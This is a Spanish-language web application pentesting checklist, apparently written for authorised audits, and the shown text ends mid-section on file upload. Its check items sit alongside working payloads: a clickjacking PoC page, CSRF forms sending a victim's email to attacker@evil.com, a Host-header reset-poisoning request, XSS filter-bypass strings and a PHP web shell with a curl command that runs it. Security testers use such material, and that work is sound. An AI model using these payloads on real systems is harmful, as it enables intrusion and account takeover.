<div style="border-left: 4px solid #e85d4a; background: #fff5f5; padding: 8px 16px; border-radius: 4px;">
📖 <strong>Más recursos:</strong> <a href="https://github.com/tu-repo/...">Nombre del recurso</a>
</div>

# Checklist Web

> Siempre que sea posible, utilizar al menos 2 cuentas durante las pruebas. Una con privilegios bajos y otra con privilegios de administración, para validar la escalada vertical. Para la escalada horizontal, usar 2 cuentas con el mismo rol.

## 📚 Tabla de contenidos

- [**Recolección de información**](#-recolección-de-información)
- [**Access control**](#-access-control)
- [**API Testing**](#-api-testing)
- [**Autenticación**](#-autenticación)
- [**Clickjacking**](#-clickjacking)
- [**Cabeceras de seguridad**](#-cabeceras-de-seguridad)
- [**CSRF**](#-csrf)
- [**XSS**](#-xss)
- [**File Upload**](#-file-upload)
- [**GraphQL**](#-graphql)
- [**Gestión de sesiones**](#-gestión-de-sesiones)
- [**Host Header Attacks**](#-host-header-attacks)
- [**HTTP Request Smuggling**](#-http-request-smuggling)
- [**Deserialización insegura**](#-deserialización-insegura)
- [**NoSQL**](#-nosql)
- [**Command Injection**](#-command-injection)
- [**Path Traversal**](#-path-traversal)
- [**Prototype pollution**](#-prototype-pollution)
- [**SSRF**](#-ssrf)
- [**SSTI**](#-ssti)
- [**SQL Injection**](#-sql-injection)
- [**Transmisión Segura**](#-transmisión-segura)
- [**XXE**](#-xxe)
- [**Web Cache Poisoning**](#-web-cache-poisoning)

*** 

## 🔍 Recolección de información

### 1. Reconocimiento pasivo (OSINT)

* [ ] Buscar información pública sobre el target sin interactuar directamente con la aplicación:
  * **Google Dorks** — buscar contenido sensible indexado:

```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com inurl:login
site:target.com ext:sql OR ext:bak OR ext:env
site:target.com "index of"
```

* [ ] [**Wayback Machine**](https://web.archive.org) — recuperar versiones antiguas de la aplicación y endpoints históricos
* [ ] [**Shodan**](https://www.shodan.io) — buscar información sobre el servidor: puertos abiertos, tecnologías, certificados
* [ ] [**crt.sh**](https://crt.sh/?q=target.com) — consultar certificados SSL emitidos para el dominio
* [ ] Usar **gau** o **waybackurls** para recuperar URLs históricas con parámetros que puedan ser interesantes:

```bash
gau target.com | grep "?"
waybackurls target.com | grep "?"
```


### 2. Detección de WAF

* [ ] Verificar si la aplicación está protegida por un WAF usando **WAFW00F**:

```bash
wafw00f https://target.com
```

* [ ] Si hay WAF, solicitar al cliente que lo desactive siempre que sea posible.



### 3. Fingerprinting de tecnologías

* [ ] Identificar el stack tecnológico completo de la aplicación:
  * **Wappalyzer** — extensión de navegador para identificación automática de tecnologías
  * **whatweb** — fingerprinting desde línea de comandos:

```bash
whatweb -a 3 https://target.com
```

* [ ] Revisar extensiones de ficheros en las URLs: `.php`, `.asp`, `.aspx`, `.jsp`, `.do`, `.cfm`
* [ ] Revisar cabeceras de respuesta informativas: `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-Generator`, `X-AspNetMvc-Version`
* [ ] Documentar todas las tecnologías identificadas — cada tecnología puede tener vulnerabilidades conocidas específicas.



### 4. Exploración manual del sitio web

* [ ] Activar Burp Suite e interceptar todo el tráfico navegando manualmente por el sitio — ir a `Target → Site map` y verificar todos los endpoints descubiertos.
* [ ] Prestar atención a los problemas detectados automáticamente por Burp en la pestaña `Issues`.
* [ ] Verificar diferencias de contenido basadas en el User-Agent:
  * Acceder como crawler de motor de búsqueda: `Googlebot`
  * Acceder como agente móvil para detectar versiones móviles de la aplicación



### 5. Spider / Crawl en busca de contenido oculto

* [ ] Ejecutar spider/crawl para descubrir endpoints y recursos no enlazados directamente:

```bash
# Gobuster — descubrimiento de directorios y ficheros
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,js,txt

# ffuf — fuzzing de rutas
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403
```

* [ ] Usar wordlists específicas según las tecnologías identificadas para aumentar las posibilidades de descubrimiento:
  * [**SecLists**](https://github.com/danielmiessler/SecLists)
  * [**OneListForAll**](https://github.com/six2dez/OneListForAll)
  * [**assetnote**](https://wordlists.assetnote.io)



### 6. Verificación de ficheros expuestos

* [ ] Verificar la existencia de ficheros que puedan exponer contenido sensible o información de la aplicación:

```
/robots.txt
/sitemap.xml
/.DS_Store
/.git/config
/.env
/web.config
/WEB-INF/web.xml
/crossdomain.xml
/clientaccesspolicy.xml
/security.txt
/.well-known/security.txt
```



### 7. Identificación de puntos de entrada

* [ ] Identificar dónde se usan métodos GET y dónde métodos POST.
* [ ] Identificar todos los parámetros utilizados en peticiones POST — prestar atención a los parámetros ocultos (`<input type="hidden">`).
* [ ] Identificar todos los parámetros en peticiones GET — muchos pueden estar en query string separados por `&`, `~`, `:` u otros caracteres especiales o codificados.
* [ ] Prestar atención a cabeceras adicionales o personalizadas no habituales (ej. `Debug: false`, `X-Internal: true`).



### 8. Identificación de parámetros interesantes en la respuesta

* [ ] Identificar dónde se establecen, modifican o añaden nuevas cookies (`Set-Cookie`).
* [ ] Identificar redirecciones (301, 302), errores de cliente (400, 403, 404) y errores internos del servidor (500, 503).
* [ ] Observar cabeceras de respuesta informativas — por ejemplo, `Server: BIG-IP` indica balanceo de carga.
* [ ] Documentar cabeceras que revelen tecnología: `X-Powered-By`, `X-AspNet-Version`, `X-Generator`, `Server`.



### 9. Identificación de roles de usuario

* [ ] Identificar todos los roles de usuario existentes en la aplicación.
* [ ] Intentar cambiar, alterar o acceder a funcionalidades de otro rol.
* [ ] Revisar la granularidad de los roles y los permisos otorgados.
* [ ] Usar la extensión **Autorize** de Burp Suite para automatizar la verificación de control de acceso entre roles.



### 10. Análisis de código JavaScript del lado del cliente

* [ ] Ir a `Target → Site map` en Burp y localizar todos los ficheros JavaScript de la aplicación.
* [ ] Usar **LinkFinder** para extraer endpoints y rutas de API embebidos en los ficheros JS:

```bash
python3 linkfinder.py -i https://target.com -d -o cli
```

* [ ] Usar **SecretFinder** para buscar secrets, API keys y credenciales hardcodeadas en JS:

```bash
python3 secretfinder.py -i https://target.com/app.js -o cli
```

* [ ] Usar **Retire.js** para identificar librerías JavaScript con vulnerabilidades conocidas:

```bash
retire --js --path /ruta/al/js
# O usar la extensión de navegador Retire.js
```

* [ ] Verificar si existen source maps (`.js.map`) expuestos — revelan el código fuente original.

***

## 🔓 Access control

### 1. Acceso sin autenticación y tras cierre de sesión

* [ ] Verificar si es posible acceder al recurso incluso si el usuario no está autenticado.
* [ ] Verificar si es posible acceder al recurso después del cierre de sesión (tokens o sesiones no invalidadas en servidor).

> 💡 **Tip:** Copia la URL o el token de sesión antes de cerrar sesión y comprueba si siguen siendo válidos tras el logout.

### 2. Acceso a recursos de otros roles y privilegios

* [ ] Verificar si es posible acceder a funciones y recursos que deberían ser accesibles únicamente para un usuario con un rol o privilegio diferente.
* [ ] Verificar si es posible acceder a otras cuentas de usuario modificando parámetros en la URL (ej. `?user_id=1337`).

### 3. Bypass Horizontal

> Acceso a recursos de otro usuario con el mismo nivel de privilegio.

* [ ] Verificar si es posible acceder a recursos que deberían ser accesibles únicamente para un usuario con una identidad diferente pero con el mismo rol o privilegio.
* [ ] Verificar si es posible operar funciones sobre recursos que pertenecen a otro usuario con la misma identidad de rol.

### 4. Bypass Vertical

> Acceso a recursos o funciones reservadas a roles superiores.

* [ ] Verificar si es posible acceder a recursos que deberían ser accesibles solo para un usuario con un rol superior.
* [ ] Verificar si es posible acceder a funciones administrativas estando autenticado como usuario no administrativo.
* [ ] Verificar si es posible operar funciones sobre recursos que deberían ser operativos únicamente por un usuario con una identidad de rol superior o específica.

> 💡 **Tip:** Usa siempre al menos dos cuentas — una con privilegios bajos y otra con privilegios altos — para validar la escalada vertical. Para la escalada horizontal usa dos cuentas del mismo nivel.

### 5. Manipulación de respuesta y exposición de datos sensibles

* [ ] Verificar si es posible alterar el ROL de un usuario mediante la inclusión de parámetros manipulados en la respuesta del servidor.
* [ ] Verificar si se expone la contraseña u otros datos sensibles en el perfil de usuario o en las respuestas.

### 6. Prueba de Referencia de Objeto Directo Inseguro (IDOR)

* [ ] Identificar todos los puntos de la aplicación donde puedan ocurrir referencias a objetos: IDs numéricos, hashes, nombres de archivo, etc.
* [ ] Evaluar las medidas de control de acceso implementadas y determinar si son vulnerables a IDOR.
* [ ] Verificar referencias a objetos no numéricos: GUIDs o hashes que parecen opacos pero pueden ser predecibles o filtrarse en otras respuestas de la aplicación.

> 💡 **Herramienta recomendada:** Plugin [**Autorize**](https://github.com/PortSwigger/autorize) para Burp Suite. Permite automatizar la comprobación de IDOR enviando cada petición simultáneamente con la sesión de un usuario de menor privilegio.

### 7. Intercambio y manipulación de métodos HTTP

* [ ] Intercambiar métodos GET/POST (y otros: PUT, DELETE, PATCH, HEAD, OPTIONS) en busca de peticiones que el servidor procese con un método distinto al esperado.
* [ ] Probar la cabecera `X-HTTP-Method-Override: DELETE` para forzar métodos restringidos.

### 8. Manipulación de cabeceras de control de acceso

* [ ] Probar la cabecera `X-Original-URL` para reescribir la ruta solicitada y acceder a recursos restringidos.
* [ ] Probar la cabecera `X-Rewrite-URL` con el mismo objetivo en servidores que la soporten.
* [ ] Probar la cabecera `X-Forwarded-For` cuando el backend toma decisiones de acceso basándose en la IP origen (ej. redes internas).

### 9. Forced Browsing (navegación forzada)

* [ ] Intentar acceder directamente a URLs conocidas o inferidas sin tener enlace explícito a ellas.
  * Ejemplos habituales: `/admin/users`, `/dashboard/reports`, `/api/v1/admin/config`, `/internal/debug`
* [ ] Usar wordlists específicas de rutas de administración ([**SecLists — Discovery/Web-Content**](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)).

### 10. HTTP Parameter Pollution (HPP)

* [ ] Duplicar parámetros en la petición para explotar inconsistencias en cómo el servidor los procesa.
  * Ejemplo: `?id=123&id=456` — algunos frameworks usan el primer valor y otros el último.
* [ ] Probar también en el body de peticiones POST y en cabeceras cuando sean procesadas por múltiples componentes.

***

## 🔌 API Testing

### 1. Documentación expuesta públicamente

* [ ] Buscar documentación de la API expuesta públicamente en rutas conocidas:
  * `/swagger-ui` · `/swagger-ui.html` · `/swagger-ui/index.html`
  * `/api-docs` · `/api-docs/swagger.json` · `/openapi.json` · `/openapi.yaml`
  * `/v1/api-docs` · `/v2/api-docs` · `/v3/api-docs`
  * `/graphql` · `/graphiql` · `/altair` (GraphQL introspection)
  * `/wsdl` · `?wsdl` (servicios SOAP)
  * `/redoc` · `/api/redoc`
* [ ] Si se encuentra documentación, enumerarla completamente: endpoints disponibles, métodos HTTP aceptados, parámetros esperados y esquemas de autenticación.
* [ ] Verificar si la documentación expone endpoints, parámetros o funciones que no son accesibles desde la UI pero sí desde la API directamente.

> 💡 **Tip:** Usa [**ffuf**](https://github.com/ffuf/ffuf) o [**feroxbuster**](https://github.com/epi052/feroxbuster) con wordlists específicas de rutas de API ([**SecLists/Discovery/Web-Content/api**](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)) para descubrir documentación no enlazada.

### 2. Endpoints antiguos y versionado inseguro

* [ ] Identificar la versión actual de la API en uso (ej. `/api/v3/`) e intentar acceder a versiones anteriores: `/api/v1/`, `/api/v2/`, `/api/v0/`.
* [ ] Comprobar si las versiones antiguas tienen los mismos controles de seguridad (autenticación, autorización, validación de entrada) que la versión actual.
* [ ] Verificar si endpoints deprecados siguen activos y pueden utilizarse.

### 3. BOLA — Broken Object Level Authorization

> Equivalente al IDOR en APIs REST. Es la vulnerabilidad más crítica según OWASP API Security Top 10 (API1:2023).

* [ ] Identificar todos los endpoints que reciben un identificador de objeto: IDs numéricos, UUIDs, slugs, hashes.
* [ ] Sustituir el identificador por el de otro usuario o recurso y verificar si el servidor devuelve datos no autorizados.
* [ ] Probar en todos los métodos HTTP: GET, POST, PUT, PATCH, DELETE.

### 4. Exceso de datos en respuesta

> La API devuelve más campos de los que la UI muestra al usuario final (API3:2023).

* [ ] Analizar las respuestas JSON/XML de la API y compararlas con lo que muestra la interfaz de usuario — buscar campos ocultos como `password`, `token`, `role`, `isAdmin`, `internalId`, `ssn`, `creditCard`.
* [ ] Comprobar si campos sensibles se devuelven aunque no sean necesarios para la función del endpoint.

### 5. Mass Assignment

* [ ] Analizar las respuestas de la API para descubrir campos internos que el servidor maneja pero no expone en los formularios de la UI.
* [ ] Intentar incluir campos sensibles en el body de la petición que el servidor no debería aceptar del cliente:
  * `"role": "admin"` · `"isAdmin": true` · `"isVerified": true` · `"credits": 9999` · `"balance": 99999`
* [ ] Probar en endpoints de registro de usuario, actualización de perfil y creación de recursos.

```json
// Ejemplo — POST /api/register
{
  "username": "test",
  "password": "test1234",
  "role": "admin",
  "isVerified": true,
  "credits": 9999
}
```

***

## 🔑 Autenticación

### 1. Enumeración de usuarios

* [ ] Buscar páginas donde la aplicación verifique si un usuario existe o no: formulario de login, registro y restablecimiento de contraseña.
* [ ] Verificar si la aplicación devuelve **mensajes de error diferentes** para usuarios válidos e inválidos:
  * Login: _"Usuario incorrecto"_ vs _"Contraseña incorrecta"_ → vulnerable.
  * Reset: _"Si el email existe recibirás un enlace"_ vs _"Email no encontrado"_ → vulnerable.
* [ ] Verificar diferencias en el **tiempo de respuesta** entre usuarios válidos e inválidos (timing attack) — medir con Burp Intruder columna de respuesta.
* [ ] Probar enumeración en el formulario de **registro**: ¿indica si el email/usuario ya está en uso?

> 💡 **Tip:** Usa Burp Intruder con una lista de usuarios y ordena por longitud o tiempo de respuesta para identificar usuarios válidos sin necesidad de un mensaje explícito.



### 2. Autenticación de dos factores (2FA / MFA)

* [ ] Verificar si el OTP (One-Time Password) es **reutilizable** tras haber sido usado una vez.
* [ ] Verificar si el OTP tiene una **expiración adecuada** — probar OTPs caducados para comprobar si siguen siendo aceptados.
* [ ] Probar si es posible **saltar el paso de 2FA** accediendo directamente a la URL post-login sin completar el segundo factor.
* [ ] Verificar si existe protección contra **fuerza bruta** sobre el código OTP (6 dígitos = 1.000.000 combinaciones).

> 💡 **Tip:** Para testear el bypass de 2FA, completa el primer factor (usuario/contraseña), copia la URL de la página que solicita el OTP y navega directamente a la URL del dashboard o área privada sin introducir el código.



### 3. Restablecimiento y recuperación de contraseña

* [ ] Evaluar si el proceso de restablecimiento de contraseña es **más débil** que el propio proceso de autenticación.
* [ ] Probar la protección contra **ataques de fuerza bruta** en el formulario de reset.
* [ ] Probar **Host Header Injection** en el email de reset: el enlace generado usa el header `Host`, que puede manipularse para apuntar a un servidor del atacante.

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
...
email=victim@target.com
```

* [ ] Verificar si el token de reset sigue siendo **válido después de cambiar la contraseña** (el token debería invalidarse al usarse).

### Si se envía un enlace por correo electrónico o SMS:

* [ ] Verificar si el enlace utiliza **HTTPS**.
* [ ] Verificar si el enlace puede ser **utilizado múltiples veces** (debería ser de un solo uso).
* [ ] Verificar si el enlace **expira** si permanece sin uso durante un tiempo razonable.
* [ ] Evaluar si el token es lo suficientemente **largo y aleatorio** (mínimo 128 bits de entropía).
* [ ] Verificar si el enlace contiene un **ID de usuario** en texto claro o codificado en Base64.
* [ ] Verificar si el token se **filtra a terceros** a través de cabeceras `Referer` o integraciones de terceros (analytics, CDN).



### 4. Proceso de cambio de contraseña

* [ ] Verificar si al usuario se le exige **volver a autenticarse** (introducir la contraseña actual) cuando está conectado e intenta cambiarla.
* [ ] Verificar si la sesión se cierra correctamente en **todos los dispositivos activos** tras el cambio de contraseña.



### 5. Fuerza bruta en el formulario de login

* [ ] Verificar si el formulario de login tiene **protección contra fuerza bruta**: lockout de cuenta, CAPTCHA, throttling de peticiones.
* [ ] Comprobar si el **lockout es por usuario o por IP** — distintas implicaciones de seguridad.
* [ ] Probar si el bloqueo por IP puede **evadirse** rotando la IP mediante cabeceras:
  * `X-Forwarded-For: 1.2.3.4`
  * `X-Real-IP: 1.2.3.4`
  * `CF-Connecting-IP: 1.2.3.4`



### 6. Cierre de sesión

* [ ] Verificar la **presencia de la funcionalidad de cierre de sesión** en la aplicación.
* [ ] Verificar que la sesión se **invalida correctamente en el servidor** tras el logout — no solo se elimina la cookie en el cliente.
* [ ] Verificar que tras el cierre de sesión no es posible reutilizar el token o cookie de sesión anterior.
* [ ] Verificar que la sesión se cierra correctamente tras el **cambio de contraseña**.

> 💡 **Tip:** Tras hacer logout, copia el valor de la cookie de sesión y realiza una petición autenticada con ella. Si el servidor responde con éxito, la sesión no se está invalidando correctamente en el servidor.



### 7. Credenciales por defecto

* [ ] Probar credenciales por defecto en paneles de administración, CMS y frameworks identificados:
  * `admin / admin` · `admin / password` · `admin / 1234` · `root / root`
* [ ] Consultar bases de datos de credenciales por defecto:
  * [**DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
  * [**CIRT.net Default Passwords**](https://www.cirt.net/passwords)
* [ ] Verificar tecnologías identificadas (Jenkins, Tomcat, phpMyAdmin, routers, cámaras IP) y buscar sus credenciales por defecto específicas.



### 8. Transmisión de credenciales y atributos de seguridad

* [ ] Verificar que el formulario de login **transmite las credenciales siempre por HTTPS** — nunca en claro por HTTP.
* [ ] Verificar que la contraseña no se transmite ni almacena en **logs, URLs o cabeceras** de la aplicación.

***

## 👆 Clickjacking

### 1. Verificar si la aplicación es vulnerable a Clickjacking

* [ ] Usar la PoC de Clickjacking para intentar cargar la página objetivo en un iframe e identificar si es embebible:

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Clickjacking PoC</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: Arial, sans-serif; background: #f5f5f5; min-height: 100vh; }

    #controls {
      background: #1A5276;
      padding: 14px 20px;
      display: flex;
      align-items: center;
      gap: 12px;
      flex-wrap: wrap;
      position: relative;
      z-index: 999;
    }
    #controls label { font-size: 13px; color: white; opacity: 0.8; white-space: nowrap; }
    #controls input {
      flex: 1;
      min-width: 260px;
      padding: 7px 12px;
      border: none;
      border-radius: 6px;
      font-size: 13px;
      font-family: monospace;
    }
    #controls button {
      padding: 7px 18px;
      border: none;
      border-radius: 6px;
      font-size: 13px;
      cursor: pointer;
      font-weight: 500;
      color: white;
      background: #1E8449;
    }

    #demo {
      position: relative;
      width: 100%;
      height: calc(100vh - 52px);
      overflow: hidden;
    }

    #decoy {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background: #f5f5f5;
      gap: 16px;
    }
    #decoy h2 { font-size: 22px; color: #1A5276; }
    #decoy p  { font-size: 15px; color: #555; max-width: 400px; text-align: center; }
    #decoy-btn {
      padding: 14px 36px;
      font-size: 16px;
      background: #2E86C1;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 500;
    }

    #target-frame {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      border: none;
      z-index: 2;
      opacity: 0.01;
      transition: opacity .2s;
    }
    #target-frame.visible { opacity: 0.7; }
  </style>
</head>
<body>

  <div id="controls">
    <label>URL objetivo:</label>
    <input type="text" id="url-input" placeholder="https://target.com/pagina-sensible" />
    <button id="btn-toggle" onclick="toggle()">Mostrar iframe</button>
  </div>

  <div id="demo">
    <div id="decoy">
      <h2>Gana un premio ahora</h2>
      <p>Haz clic en el botón para reclamar tu recompensa exclusiva. Oferta por tiempo limitado.</p>
      <button id="decoy-btn">Reclamar premio</button>
    </div>
    <iframe id="target-frame"
      sandbox="allow-scripts allow-same-origin allow-forms"
      referrerpolicy="no-referrer">
    </iframe>
  </div>

  <script>
    let visible = false;

    function normalizeUrl(u) {
      u = u.trim();
      if (!u) return '';
      if (!/^https?:\/\//i.test(u)) u = 'https://' + u;
      return u;
    }

    function toggle() {
      const url = normalizeUrl(document.getElementById('url-input').value);
      if (!url) { alert('Introduce una URL válida.'); return; }

      const frame = document.getElementById('target-frame');
      const btn   = document.getElementById('btn-toggle');

      if (frame.src !== url) frame.src = url;

      visible = !visible;
      frame.classList.toggle('visible', visible);
      btn.textContent = visible ? 'Ocultar iframe' : 'Mostrar iframe';
      btn.style.background = visible ? '#C0392B' : '#1E8449';
    }

    document.getElementById('url-input').addEventListener('keydown', e => {
      if (e.key === 'Enter') toggle();
    });
  </script>

</body>
</html>
```

***

## 🎯 Cabeceras de seguridad

### 1. Análisis general de cabeceras

* [ ] Ejecutar [**shcheck**](https://github.com/santoru/shcheck) o [**SecurityHeaders.com**](https://securityheaders.com) para obtener una visión general del estado de las cabeceras de seguridad de la aplicación.

```bash
python shcheck.py https://target.com
```



### 2. Content Security Policy (CSP)

* [ ] Verificar si la cabecera `Content-Security-Policy` está presente y correctamente configurada.
* [ ] Evaluar la configuración de CSP con las siguientes herramientas:
  * [**CSP Evaluator (Google)**](https://csp-evaluator.withgoogle.com/) — detecta directivas débiles o inseguras.
* [ ] Identificar posibles bypasses de CSP:
  * [**HackTricks — CSP Bypass**](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)
  * [**JSONBee — JSONP endpoints para bypass de CSP**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
* [ ] Tener en cuenta que una CSP bien implementada hace innecesarios los encabezados `X-Frame-Options` y `X-XSS-Protection` — verificar igualmente su presencia como capa de defensa adicional.



### 3. HTTP Strict Transport Security (HSTS)

* [ ] Verificar si el encabezado `Strict-Transport-Security` está presente.
* [ ] Verificar que incluye la directiva `max-age` con un valor suficientemente alto (mínimo recomendado: 31536000 segundos = 1 año).
* [ ] Verificar que incluye la directiva `includeSubDomains` para extender la protección a todos los subdominios.



### 4. X-Frame-Options

* [ ] Verificar si el encabezado `X-Frame-Options` está presente.

> 💡 **Nota:** Si la CSP incluye `frame-ancestors`, este encabezado es redundante — aunque su presencia como fallback sigue siendo recomendable.



### 5. X-Content-Type-Options

* [ ] Verificar si el encabezado `X-Content-Type-Options: nosniff` está presente.



### 6. Eliminación de cabeceras informativas

* [ ] Verificar si el encabezado `Server` está presente y expone información sobre el servidor web y su versión (ej. `Apache/2.4.51`, `nginx/1.18.0`).
* [ ] Verificar si el encabezado `X-Powered-By` está presente y expone el lenguaje o framework utilizado (ej. `PHP/8.1.0`, `ASP.NET`).
* [ ] Verificar si existen otras cabeceras informativas: `X-AspNet-Version`, `X-AspNetMvc-Version`, `X-Generator`.



### 7. CORS (Cross-Origin Resource Sharing)

* [ ] Verificar si la cabecera `Access-Control-Allow-Origin` refleja el valor del header `Origin` de la petición sin validación.
* [ ] Verificar si `Access-Control-Allow-Origin: *` se combina con `Access-Control-Allow-Credentials: true` — esta combinación es inválida pero puede estar mal implementada.
* [ ] Verificar si se acepta el origen `null` en la respuesta.



### 8. Referrer-Policy

* [ ] Verificar si el encabezado `Referrer-Policy` está presente.



### 9. Permissions-Policy

* [ ] Verificar si el encabezado `Permissions-Policy` está presente.



### 10. Cache-Control en respuestas con datos sensibles

* [ ] Verificar que las páginas autenticadas y las respuestas con datos sensibles incluyen cabeceras de caché restrictivas para evitar que el navegador o proxies intermedios almacenen información sensible.

***

## 🎭 CSRF

### 1. Sin defensa

* [ ] Identificar acciones sensibles que deberían estar protegidas contra CSRF:
  * Cambio de email o contraseña
  * Cambio de datos de perfil
  * Acciones administrativas
  * Cualquier operación que modifique estado en el servidor
* [ ] Verificar si la petición no incluye ningún mecanismo de protección CSRF (token, cabecera custom, SameSite).
* [ ] Construir un PoC funcional que demuestre el impacto con la acción concreta:

```html
<!-- PoC básico sin defensa -->
<html>
  <body>
    <form action="https://target.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```



### 2. Token CSRF presente — casos de bypass

* [ ] Verificar si el token es validado correctamente probando los siguientes casos:
  * **Token vacío** — enviar el parámetro con valor vacío: `csrf_token=`
  * **Token eliminado** — eliminar el parámetro por completo de la petición
  * **Token de otra sesión** — usar un token CSRF válido pero perteneciente a otra cuenta
  * **Token predecible** — analizar la entropía del token con Burp Sequencer; verificar si es un valor predecible (timestamp, MD5 del username, etc.)

> 💡 **Tip:** Usa Burp Sequencer para analizar la entropía de los tokens CSRF capturados. Un token con baja entropía puede ser predecible.



### 3. Token no vinculado a sesión

* [ ] Verificar si el token CSRF está vinculado a la sesión del usuario o si es un valor global válido para cualquier sesión.
* [ ] Capturar el token CSRF de una cuenta controlada por el atacante e incluirlo en un PoC contra la cuenta víctima — si la acción se ejecuta, el token no está vinculado a la sesión.

```html
<!-- PoC con token de otra sesión -->
<html>
  <body>
    <form action="https://target.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="csrf_token" value="TOKEN_DE_CUENTA_ATACANTE">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```



### 4. Bypass con Method Override

* [ ] Verificar si la acción puede ejecutarse cambiando el método de POST a GET — algunos frameworks procesan ambos métodos indistintamente.
* [ ] Probar el parámetro `_method` para forzar un método diferente al de la petición:

```http
# Cambio de POST a GET
GET /change-email?email=attacker@evil.com HTTP/1.1

# Method override via parámetro
POST /change-email HTTP/1.1
...
_method=GET&email=attacker@evil.com
```



### 5. Bypass con validación de Referer

* [ ] Verificar si la aplicación valida el header `Referer` como mecanismo de protección CSRF.
* [ ] Probar los siguientes bypasses:
  * **Referer ausente** — eliminar el header `Referer` de la petición; algunos servidores aceptan peticiones sin él.
  * **Dominio legítimo como subdirectorio** — alojar el PoC en una URL que contenga el dominio legítimo como parte de la ruta: `https://evil.com/https://target.com`
  * **Dominio legítimo como subdominio** — `https://target.com.evil.com`
  * **Dominio legítimo como parámetro** — `https://evil.com/?target.com`

***

## 💉 XSS

### Nota sobre detección automática

La detección de XSS reflejado en parámetros GET/POST está cubierta por **Acunetix** como parte del proceso estándar de auditoría. Los puntos de esta sección se centran en los casos que requieren **verificación manual** porque Acunetix tiene limitaciones para detectarlos de forma fiable.

### 1. XSS Almacenado (Stored XSS)

* [ ] Identificar campos de entrada cuyos valores se almacenan en base de datos y se renderizan posteriormente para otros usuarios: comentarios, nombres de perfil, descripciones, tickets de soporte, mensajes internos.
* [ ] Prestar especial atención a campos que se renderizan en **paneles de administración** — el impacto es mayor al afectar a usuarios con privilegios elevados.
* [ ] Inyectar payloads en los campos identificados y verificar si se ejecutan al visualizar el contenido desde otra cuenta o desde el panel de administración.

```html
<!-- Payloads básicos de verificación -->
<script>alert(document.domain)</script>
"><img src=x onerror=alert(document.domain)>
'"><svg onload=alert(document.domain)>
```



### 2. XSS en DOM (DOM-based XSS)

* [ ] Revisar el código JavaScript del frontend en busca de fuentes controlables por el usuario que se asignen a sinks peligrosos sin sanitización:
  * **Fuentes:** `document.location`, `location.href`, `location.hash`, `location.search`, `document.referrer`, `window.name`
  * **Sinks:** `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `setInterval()`, `location.href`



### 3. XSS en cabeceras HTTP

* [ ] Verificar si las cabeceras `User-Agent`, `Referer` o `X-Forwarded-For` se reflejan en la respuesta HTML o en paneles de administración sin sanitización.

```http
User-Agent: <script>alert(document.domain)</script>
Referer: <script>alert(document.domain)</script>
X-Forwarded-For: <script>alert(document.domain)</script>
```



### 4. Bypass de filtros y WAF

* [ ] Si la aplicación tiene un WAF o filtros de entrada, verificar si es posible bypassearlos con variaciones de los payloads estándar.

```html
<!-- Variaciones de bypass -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="alert`1`">
<svg/onload=alert(1)>
javascript:alert(1)
<iframe src="javascript:alert(1)">
<body onpageshow=alert(1)>

<!-- Bypass con encoding -->
%3Cscript%3Ealert(1)%3C/script%3E
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- Bypass con comentarios HTML -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>
```

> 💡 **Recursos:** [**XSStrike**](https://github.com/s0md3v/XSStrike) y [**dalfox**](https://github.com/hahwul/dalfox) automatizan la búsqueda de bypasses de filtros y WAF.



### 5. XSS en contextos especiales

* [ ] Verificar XSS en valores de **atributos HTML** — el payload estándar con `<script>` no funciona aquí:

```html
<!-- Contexto: <input value="[AQUÍ]"> -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```

* [ ] Verificar XSS dentro de bloques **`<script>`** — si el input se refleja dentro de código JavaScript:

```javascript
// Contexto: var name = "[AQUÍ]";
// Payload:
"-alert(1)-"
';alert(1)//
```

* [ ] Verificar XSS en **SVG** y en valores de **atributos de estilo CSS**:

```html
<svg><script>alert(1)</script></svg>
<svg onload=alert(1)>
```

* [ ] Verificar XSS en el contexto de **`href`** de enlaces:

```html
<!-- Contexto: <a href="[AQUÍ]"> -->
javascript:alert(document.domain)
```

***

## 📂 File Upload

### 1. Shell upload sin protección

* [ ] Verificar si es posible subir directamente un fichero con extensión de script del lado servidor sin ningún tipo de validación. Probar con extensiones según el stack tecnológico identificado: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`, `.asp`, `.aspx`, `.jsp`, `.py`, `.rb`
* [ ] Tras la subida, localizar la URL donde se almacena el fichero y verificar que el servidor **ejecuta** el código — no solo que acepta el fichero.

```php
<?php system($_GET["cmd"]); ?>
```

```bash
# Verificar ejecución
curl "https://target.com/uploads/shell.php?cmd=id"
```



### 2. Shell upload modificando Content-Type

* [ ] Subir un fichero `.php` (u otra extensión ejecutable) modificando el `Content-Type` a un valor de imagen permitido:
  * `Content-Type: image/jpeg`
  * `Content-Type: image/png`
  * `Content-Type: image/gif`
* [ ] Interceptar la petición con Burp Suite y modificar la cabecera `Content-Type` manteniendo el contenido del fichero como código ejecutable.

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
